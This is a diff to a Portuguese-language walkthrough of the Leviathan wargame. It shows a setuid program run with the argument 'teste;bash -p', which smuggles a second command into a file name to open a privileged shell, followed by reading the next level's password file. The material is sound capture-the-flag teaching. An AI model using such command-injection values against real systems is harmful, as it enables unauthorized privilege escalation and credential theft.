@@ -211,6 +211,8 @@ Bem... o cat funciona de um jeito diferente ele permite ler dois arquivos de uma
 
 >leviathan2@leviathan:/tmp$ /home/leviathan2/printfile "teste;bash -p"
 
+e junto com o nosso programa permite que eu execute um bash como um usuario de permisão mais alta ;D
+
 >leviathan3@leviathan:/tmp$   
 
 >leviathan3@leviathan:/tmp$ cat /etc/leviathan_pass/leviathan3
